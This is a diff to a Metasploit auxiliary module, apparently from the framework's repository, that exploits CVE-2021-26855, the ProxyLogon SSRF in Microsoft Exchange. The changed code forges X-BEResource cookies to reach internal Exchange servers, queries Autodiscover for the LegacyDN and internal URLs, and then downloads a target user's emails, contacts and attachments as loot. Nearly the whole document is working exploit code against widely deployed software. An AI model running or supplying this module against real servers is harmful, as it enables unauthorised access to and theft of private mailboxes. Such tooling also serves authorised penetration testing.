@@ -81,31 +81,31 @@ class MetasploitModule < Msf::Auxiliary
   XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze
 
   def dump_contacts(server_name)
-    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}"
 
-    response = send_xml(soap_countitems(action['id_attribute']), ssrf)
+    response = send_xml('POST', ssrf, soap_countitems(action['id_attribute']))
     if response.body =~ /Success/
-      print_status(" * successfuly connected to: #{action['id_attribute']}")
+      print_good("Successfuly connected to: #{action['id_attribute']}")
       xml = Nokogiri::XML.parse(response.body)
 
-      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS).values[0]
-      print_status(" * selected folder: #{action['id_attribute']} (#{folder_id})")
+      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values[0]
+      print_status("Selected folder: #{action['id_attribute']} (#{folder_id})")
 
-      total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS).content
-      print_status(" * number of contact found: #{total_count}")
+      total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS)&.content
+      print_status("Number of contact found: #{total_count}")
 
       if total_count.to_i > datastore['MaxEntries']
-        print_warning(" * number of contact recalculated due to max entries: #{datastore['MaxEntries']}")
+        print_warning("Number of contact recalculated due to max entries: #{datastore['MaxEntries']}")
         total_count = datastore['MaxEntries'].to_s
       end
 
-      response = send_xml(soap_listitems(action['id_attribute'], total_count), ssrf)
+      response = send_xml('POST', ssrf, soap_listitems(action['id_attribute'], total_count))
       xml = Nokogiri::XML.parse(response.body)
 
       print_status(message("Processing dump of #{total_count} items"))
       data = xml.xpath('//t:Items/t:Contact', XMLNS)
       if data.empty?
-        print_status(' * the user has no contacts')
+        print_status('The user has no contacts')
       else
         write_loot("#{datastore['EMAIL']}_#{action['id_attribute']}", data.to_s)
       end
@@ -113,21 +113,21 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dump_emails(server_name)
-    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~#{random_ssrf_id}"
 
-    response = send_xml(soap_countitems(datastore['FOLDER']), ssrf)
+    response = send_xml('POST', ssrf, soap_countitems(datastore['FOLDER']))
     if response.body =~ /Success/
-      print_status(" * successfuly connected to: #{datastore['FOLDER']}")
+      print_good("Successfuly connected to: #{datastore['FOLDER']}")
       xml = Nokogiri::XML.parse(response.body)
 
-      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS).values[0]
-      print_status(" * selected folder: #{datastore['FOLDER']} (#{folder_id})")
+      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values[0]
+      print_status("Selected folder: #{datastore['FOLDER']} (#{folder_id})")
 
-      total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS).content
-      print_status(" * number of email found: #{total_count}")
+      total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS)&.content
+      print_status("Number of email found: #{total_count}")
 
       if total_count.to_i > datastore['MaxEntries']
-        print_warning(" * number of email recalculated due to max entries: #{datastore['MaxEntries']}")
+        print_warning("Number of email recalculated due to max entries: #{datastore['MaxEntries']}")
         total_count = datastore['MaxEntries'].to_s
       end
 
@@ -137,18 +137,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def download_attachments(item_id, ssrf)
-    response = send_xml(soap_listattachments(item_id), ssrf)
+    response = send_xml('POST', ssrf, soap_listattachments(item_id))
     xml = Nokogiri::XML.parse(response.body)
 
     xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item|
-      item_id = item.at_xpath('./t:AttachmentId', XMLNS).values[0]
+      item_id = item.at_xpath('./t:AttachmentId', XMLNS)&.values[0]
 
-      response = send_xml(soap_downattachment(item_id), ssrf)
+      response = send_xml('POST', ssrf, soap_downattachment(item_id))
       data = Nokogiri::XML.parse(response.body)
 
-      filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS).content
-      ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS).content
-      content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS).content
+      filename = data.at_xpath('//t:FileAttachment/t:Name', XMLNS)&.content
+      ctype = data.at_xpath('//t:FileAttachment/t:ContentType', XMLNS)&.content
+      content = data.at_xpath('//t:FileAttachment/t:Content', XMLNS)&.content
 
       print_status("   -> attachment: #{item_id} (#{filename})")
       write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(content), filename, ctype)
@@ -156,20 +156,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def download_items(total_count, ssrf)
-    response = send_xml(soap_listitems(datastore['FOLDER'], total_count), ssrf)
+    response = send_xml('POST', ssrf, soap_listitems(datastore['FOLDER'], total_count))
     xml = Nokogiri::XML.parse(response.body)
 
     xml.xpath('//t:Items/t:Message', XMLNS).each do |item|
-      item_info = item.at_xpath('./t:ItemId', XMLNS).values
-      print_status(" * download item: #{item_info[1]}")
+      item_info = item.at_xpath('./t:ItemId', XMLNS)&.values
+      print_status("Download item: #{item_info[1]}")
 
-      response = send_xml(soap_downitem(item_info[0], item_info[1]), ssrf)
+      response = send_xml('POST', ssrf, soap_downitem(item_info[0], item_info[1]))
       data = Nokogiri::XML.parse(response.body)
 
-      email = data.at_xpath('//t:Message/t:MimeContent', XMLNS).content
+      email = data.at_xpath('//t:Message/t:MimeContent', XMLNS)&.content
       write_loot("#{datastore['EMAIL']}_#{datastore['FOLDER']}", Rex::Text.decode_base64(email))
 
-      attachments = item.at_xpath('./t:HasAttachments', XMLNS).content
+      attachments = item.at_xpath('./t:HasAttachments', XMLNS)&.content
       if datastore['ATTACHMENTS'] && attachments == 'true'
         download_attachments(item_info[0], ssrf)
       end
@@ -181,23 +181,35 @@ class MetasploitModule < Msf::Auxiliary
     "#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
+  def random_ssrf_id
+    # https://en.wikipedia.org/wiki/2,147,483,647 (lol)
+    # max. 2147483647
+    rand(1941962752..2147483647)
+  end
+
   def request_autodiscover(server_name)
     xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }
 
-    response = send_xml(soap_autodiscover, "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522")
-    fail_with(Failure::Unknown, 'No Autodiscover information was found') if response.body =~ /<ErrorCode>500<\/ErrorCode>/
+    response = send_xml('POST', "#{server_name}/autodiscover/autodiscover.xml?a=~#{random_ssrf_id}", soap_autodiscover)
+
+    case response.body
+    when %r{<ErrorCode>500</ErrorCode>}
+      fail_with(Failure::NotFound, 'No Autodiscover information was found')
+    when %r{<Action>redirectAddr</Action>}
+      fail_with(Failure::NotFound, 'No email address was found')
+    end
 
     xml = Nokogiri::XML.parse(response.body)
 
-    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
-    fail_with(Failure::Unknown, 'No \'LegacyDN\' was found') if legacy_dn.empty?
+    legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns)&.content
+    fail_with(Failure::NotFound, 'No \'LegacyDN\' was found') if legacy_dn.empty?
 
     server = ''
     owa_urls = []
     xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
       type = item.at_xpath('./xmlns:Type', xmlns).content
       if type == 'EXCH'
-        server = item.at_xpath('./xmlns:Server', xmlns).content
+        server = item.at_xpath('./xmlns:Server', xmlns)&.content
       end
 
       next unless type == 'WEB'
@@ -206,13 +218,13 @@ class MetasploitModule < Msf::Auxiliary
         owa_urls << owa_url.content
       end
     end
-    fail_with(Failure::Unknown, 'No \'Server ID\' was found') if server.empty?
-    fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') if owa_urls.empty?
+    fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.empty?
+    fail_with(Failure::NotFound, 'No \'OWAUrl\' was found') if owa_urls.empty?
 
     return([server, legacy_dn, owa_urls])
   end
 
-  def send_http(method, ssrf, data = '', ctype = 'application/x-www-form-urlencoded')
+  def send_http(method, ssrf, data: '', ctype: 'application/x-www-form-urlencoded')
     request = {
       'method' => method,
       'uri' => @random_uri,
@@ -222,22 +234,13 @@ class MetasploitModule < Msf::Auxiliary
     request = request.merge({ 'data' => data }) unless data.empty?
 
     received = send_request_cgi(request)
-    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
+    fail_with(Failure::TimeoutExpired, 'Server did not respond in an expected way') unless received
 
     received
   end
 
-  def send_xml(data, ssrf)
-    received = send_request_cgi(
-      'method' => 'POST',
-      'uri' => @random_uri,
-      'cookie' => "X-BEResource=#{ssrf};",
-      'ctype' => 'text/xml; charset=utf-8',
-      'data' => data
-    )
-    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
-
-    received
+  def send_xml(method, ssrf, data, ctype: 'text/xml; charset=utf-8')
+    send_http(method, ssrf, data: data, ctype: ctype)
   end
 
   def soap_autodiscover
@@ -368,7 +371,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def write_loot(type, data, name = '', ctype = 'text/plain')
     loot_path = store_loot(type, ctype, datastore['RHOSTS'], data, name, '')
-    print_good(" * file saved to #{loot_path}")
+    print_good("File saved to #{loot_path}")
   end
 
   def run
@@ -378,42 +381,43 @@ class MetasploitModule < Msf::Auxiliary
     print_status(message('Attempt to exploit for CVE-2021-26855'))
 
     # request for internal server name.
-    response = send_http(datastore['METHOD'], 'localhost~1942062522')
+    response = send_http(datastore['METHOD'], "localhost~#{random_ssrf_id}")
     if response.code != 500 || response.headers['X-FEServer'].empty?
       print_bad('Could\'t get the \'X-FEServer\' from the headers response.')
 
       return
     end
     server_name = response.headers['X-FEServer']
-    print_status(" * internal server name (#{server_name})")
+    print_status("Internal server name (#{server_name})")
 
     # get informations by autodiscover request.
     print_status(message('Sending autodiscover request'))
-    discover_info = request_autodiscover(server_name)
-    server_id = discover_info[0]
-    legacy_dn = discover_info[1]
+    server_id, legacy_dn, owa_urls = request_autodiscover(server_name)
 
-    print_status(" * Server: #{server_id}")
-    print_status(" * LegacyDN: #{legacy_dn}")
+    print_status("Server: #{server_id}")
+    print_status("LegacyDN: #{legacy_dn}")
+    print_status("Internal target(s): #{owa_urls.join(', ')}")
 
     # selecting target
-    print_status(message('Selecting the first internal server found'))
-    if datastore['TARGET'].nil?
+    print_status(message('Selecting the first internal server to respond'))
+    if datastore['TARGET'].nil? || datastore['TARGET'].empty?
       target = ''
-      discover_info[2].each do |url|
+      owa_urls.each do |url|
         host = url.split('://')[1].split('.')[0].downcase
         next unless host != server_name.downcase
 
+        response = send_http('GET', "#{host}/EWS/Exchange.asmx?a=~#{random_ssrf_id}")
+        next unless response.code == 200
+
         target = host
+        print_good("Targeting internal: #{url}")
 
         break
       end
-      fail_with(Failure::Unknown, 'No internal target was found') if target.empty?
-
-      print_status(" * targeting internal: #{target}")
+      fail_with(Failure::NotFound, 'No internal target was found') if target.empty?
     else
       target = datastore['TARGET']
-      print_status(" * targeting internal forced to: #{target}")
+      print_good("Targeting internal forced to: #{target}")
     end
 
     # run action
